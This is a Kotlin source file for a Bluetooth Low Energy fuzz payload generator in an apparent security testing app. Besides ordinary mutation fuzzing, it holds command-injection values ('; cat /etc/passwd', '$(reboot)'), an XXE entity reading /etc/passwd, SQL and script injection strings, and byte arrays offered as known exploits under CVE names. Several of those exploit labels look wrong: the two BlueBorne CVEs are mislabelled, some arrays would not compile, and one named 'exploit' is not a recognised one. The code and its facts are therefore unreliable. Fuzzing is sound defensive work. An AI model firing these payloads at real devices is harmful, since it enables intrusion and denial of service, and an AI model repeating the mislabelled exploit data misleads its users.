/*
 * Bluetooth Security Testing Tool
 * Copyright (c) 2026 Security Research Team
 *
 * Licensed under MIT with additional restrictions:
 * - This application may ONLY be used for authorized security testing
 * - See LICENSE for full terms
 *
 * MIT License - See LICENSE for full terms.
 */
package com.btsec.testtool.data.fuzzing

import com.btsec.testtool.domain.model.FuzzDataPattern
import com.btsec.testtool.domain.model.FuzzMethod
import com.btsec.testtool.domain.model.PatternType
import java.util.Random
import javax.inject.Inject
import javax.inject.Singleton

/**
 * Generates fuzzing payloads for BLE protocol testing across multiple strategies.
 * All payloads are deterministic when a seed is provided for reproducible sessions.
 */
@Singleton
class FuzzPayloadGenerator @Inject constructor() {

    companion object {
        private const val MAX_RANDOM_SIZE = 512
        private const val MAX_LENGTH_FUZZ = 4096
        private const val ATT_WRITE_REQ: Byte = 0x12
        private const val ATT_WRITE_CMD: Byte = 0x52
        private const val ATT_READ_REQ: Byte = 0x0A
        private const val ATT_FIND_INFO: Byte = 0x04
        private const val ATT_PREP_WRITE: Byte = 0x16
        private const val ATT_EXEC_WRITE: Byte = 0x18
        private const val L2CAP_INFO_REQ: Byte = 0x0A
        private const val L2CAP_CONN_REQ: Byte = 0x02
    }

    /** Generates [count] payloads for the given [method]. */
    fun generatePayloads(method: FuzzMethod, count: Int, seed: Long?, validPacket: ByteArray? = null): List<ByteArray> {
        val rng = seed?.let(::Random) ?: Random()
        return when (method) {
            FuzzMethod.BIT_FLIP -> bitFlip(rng, count, validPacket)
            FuzzMethod.BYTE_FLIP -> byteFlip(rng, count, validPacket)
            FuzzMethod.RANDOM -> randomBytes(rng, count)
            FuzzMethod.SEQUENTIAL -> sequential(rng, count)
            FuzzMethod.LENGTH_FUZZING -> lengthFuzz(rng, count, validPacket)
            FuzzMethod.BOUNDARY_CASE -> boundary(count)
            FuzzMethod.FORMAT_STRING -> formatString(count)
            FuzzMethod.INJECTION -> injection(count)
            FuzzMethod.MUTATION -> mutation(rng, count, validPacket)
            FuzzMethod.PROTOCOL_STATE -> protoState(rng, count)
            FuzzMethod.REPLAY -> replay(count, validPacket)
            FuzzMethod.DELAY -> delay(count, validPacket)
        }
    }

    /** Returns hardcoded known BLE exploit patterns (BlueBorne, BleedingTooth, KNOB, etc.). */
    fun generateKnownExploitPayloads(): List<FuzzDataPattern> = listOf(
        // BlueBorne L2CAP info leak (CVE-2017-0781)
        FuzzDataPattern("BlueBorne L2CAP Info Leak",
            "L2CAP info request with oversized length to leak kernel memory (CVE-2017-0781)",
            PatternType.KNOWN_EXPLOIT,
            byteArrayOf(0x08, 0x00, 0x14, 0x00, 0x01, 0x00, L2CAP_INFO_REQ, 0x00,
                0x10, 0x00, 0x02, 0x00, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41)),
        // BlueBorne L2CAP RCE (CVE-2017-0785)
        FuzzDataPattern("BlueBorne L2CAP RCE",
            "Crafted L2CAP packet for stack overflow RCE (CVE-2017-0785)",
            PatternType.KNOWN_EXPLOIT,
            byteArrayOf(0x08, 0x20, 0x0A, 0x00, 0x01, 0x00, L2CAP_CONN_REQ, 0x01,
                0x04, 0x00, 0x00, 0x01, 0x01, 0x00)),
        // BleedingTooth BadChoice (CVE-2020-12351)
        FuzzDataPattern("BleedingTooth BadChoice",
            "Malformed A2MP packet causing type confusion (CVE-2020-12351)",
            PatternType.KNOWN_EXPLOIT,
            byteArrayOf(0x08, 0x20, 0x08, 0x00, 0x03, 0x00, 0x01, 0x00, 0x04, 0x00, 0xFF, 0xFF)),
        // BleedingTooth BadKarma (CVE-2020-12352)
        FuzzDataPattern("BleedingTooth BadKarma",
            "Heap buffer overflow via L2CAP config (CVE-2020-12352)",
            PatternType.KNOWN_EXPLOIT,
            byteArrayOf(0x0C, 0x20, 0x20, 0x00, 0x01, 0x00, 0x05, 0x02, 0x1C, 0x00,
                0x41, 0x00, 0x00, 0x00, 0x01, 0x02, 0x04, 0x00, 0x04, 0x14,
                0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
                0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41)),
        // BLE Smurf flood
        FuzzDataPattern("BLE Smurf Flood",
            "Malformed BLE advertising packets for DoS testing",
            PatternType.KNOWN_EXPLOIT,
            byteArrayOf(0x02, 0x00, 0x00, 0xFF.toByte(), 0xFF.toByte(), 0xFF.toByte(),
                0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41)),
        // KNOB Attack (CVE-2019-9506)
        FuzzDataPattern("KNOB Attack Key Negotiation",
            "Force minimum entropy during pairing (CVE-2019-9506)",
            PatternType.KNOWN_EXPLOIT,
            byteArrayOf(0x01, 0x01, 0x00, 0x01, 0x07, 0x00, 0x00)),
        // GATT Write overflow
        FuzzDataPattern("GATT Write Overflow",
            "ATT Write Request exceeding negotiated MTU",
            PatternType.KNOWN_EXPLOIT,
            ByteArray(257) { idx -> if (idx == 0) ATT_WRITE_REQ else if (idx in 1..2) 0x00 else 0x41 })
    )

    // --- Payload generators ---

    private fun bitFlip(rng: Random, count: Int, base: ByteArray?): List<ByteArray> {
        if (base == null || base.isEmpty()) return randomBytes(rng, count)
        return (0 until count).map {
            val p = base.copyOf()
            repeat(rng.nextInt(3) + 1) {
                p[rng.nextInt(p.size)] = (p[rng.nextInt(p.size)].toInt() xor (1 shl rng.nextInt(8))).toByte()
            }
            p
        }
    }

    private fun byteFlip(rng: Random, count: Int, base: ByteArray?): List<ByteArray> {
        if (base == null || base.isEmpty()) return randomBytes(rng, count)
        return (0 until count).map {
            val p = base.copyOf()
            repeat(rng.nextInt(3) + 1) {
                p[rng.nextInt(p.size)] = if (rng.nextBoolean()) 0x00.toByte() else 0xFF.toByte()
            }
            p
        }
    }

    private fun randomBytes(rng: Random, count: Int): List<ByteArray> =
        (0 until count).map { ByteArray(rng.nextInt(MAX_RANDOM_SIZE) + 1) { rng.nextInt(256).toByte() } }

    private fun sequential(rng: Random, count: Int): List<ByteArray> =
        (0 until count).map { i -> ByteArray(rng.nextInt(64) + 1) { j -> ((i + j) % 256).toByte() } }

    private fun lengthFuzz(rng: Random, count: Int, base: ByteArray?): List<ByteArray> {
        val hdr = if (base != null && base.size >= 3) base.copyOfRange(0, 3)
        else byteArrayOf(ATT_WRITE_REQ, 0x00, 0x01)
        return (0 until count).map { hdr + ByteArray(rng.nextInt(MAX_LENGTH_FUZZ + 1)) { rng.nextInt(256).toByte() } }
    }

    private fun boundary(count: Int): List<ByteArray> {
        val base = listOf(byteArrayOf(0x00), byteArrayOf(0xFF.toByte()), byteArrayOf(),
            byteArrayOf(0x00, 0x00, 0x00, 0x00), byteArrayOf(0xFF.toByte(), 0xFF.toByte(), 0xFF.toByte(), 0xFF.toByte()),
            byteArrayOf(0x7F.toByte()), byteArrayOf(0x80.toByte()), byteArrayOf(0x01),
            byteArrayOf(Byte.MAX_VALUE, Byte.MIN_VALUE), byteArrayOf(ATT_WRITE_REQ, 0xFF.toByte(), 0xFF.toByte()))
        return if (count <= base.size) base.take(count)
        else base + (base.size until count).map { ByteArray(it % 8) { i -> (if (i % 2 == 0) 0 else 0xFF).toByte() } }
    }

    private fun formatString(count: Int): List<ByteArray> {
        val t = listOf("%s%n%x%d%p", "%n%n%n%n", "%s%s%s%s%s%s%s%s%s%s",
            "%x%x%x%x%x%x%x%x%x%x", "%p%p%p%p%p%p%p%p%p%p", "%s" + "%n".repeat(64),
            "%.10000d", "%.99999d%n", "%*d%n", "%0256d%n", "%256x%n",
            "%s%n" + "%x".repeat(32), "AAAA%08x.%08x.%08x.%08x",
            "%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s", "%%%.8x" + "%n".repeat(10))
        return (0 until count).map { t[it % t.size].toByteArray() }
    }

    private fun injection(count: Int): List<ByteArray> {
        val t = listOf("' OR 1=1--", "'; DROP TABLE devices--", "\" OR \"\"=\"",
            "1' UNION SELECT NULL--", "' OR '1'='1",
            "<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg/onload=alert(1)>",
            "<?xml version=\"1.0\"?>", "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
            "admin\u0000", "../../../etc/passwd", "; cat /etc/passwd", "| ls -la",
            "$(reboot)", "`reboot`", "*()()()", ")(|(cn=*",
            "A".repeat(256), "{\"cmd\":\"reboot\"}", "\r\n\r\n", "\u0000\u0000\u0000\u0000")
        return (0 until count).map { t[it % t.size].toByteArray() }
    }

    private fun mutation(rng: Random, count: Int, base: ByteArray?): List<ByteArray> {
        if (base == null || base.isEmpty()) return randomBytes(rng, count)
        return (0 until count).map {
            when (rng.nextInt(3)) {
                0 -> { // insert
                    val pos = rng.nextInt(base.size + 1)
                    base.sliceArray(0 until pos) + ByteArray(rng.nextInt(8) + 1) { rng.nextInt(256).toByte() } +
                        base.sliceArray(pos until base.size)
                }
                1 -> { // delete
                    if (base.size <= 1) base.copyOf()
                    else {
                        val pos = rng.nextInt(base.size)
                        val len = minOf(rng.nextInt(4) + 1, base.size - pos)
                        base.sliceArray(0 until pos) + base.sliceArray((pos + len) until base.size)
                    }
                }
                else -> { // replace
                    val r = base.copyOf()
                    repeat(rng.nextInt(4) + 1) { r[rng.nextInt(r.size)] = rng.nextInt(256).toByte() }
                    r
                }
            }
        }
    }

    private fun protoState(rng: Random, count: Int): List<ByteArray> {
        val ops = byteArrayOf(ATT_WRITE_CMD, ATT_WRITE_REQ, ATT_READ_REQ, ATT_FIND_INFO, ATT_PREP_WRITE, ATT_EXEC_WRITE)
        return (0 until count).map {
            val op = if (rng.nextBoolean()) (ops[rng.nextInt(ops.size)].toInt() xor rng.nextInt(256)).toByte()
            else ops[rng.nextInt(ops.size)]
            ByteArray(3 + rng.nextInt(32)) { i -> if (i == 0) op else rng.nextInt(256).toByte() }
        }
    }

    private fun replay(count: Int, base: ByteArray?): List<ByteArray> {
        val p = base ?: byteArrayOf(ATT_WRITE_CMD, 0x00, 0x01)
        return (0 until count).map { p.copyOf() }
    }

    private fun delay(count: Int, base: ByteArray?): List<ByteArray> {
        val p = base ?: byteArrayOf(ATT_READ_REQ, 0x00, 0x01)
        return (0 until count).map { p.copyOf() }
    }
}
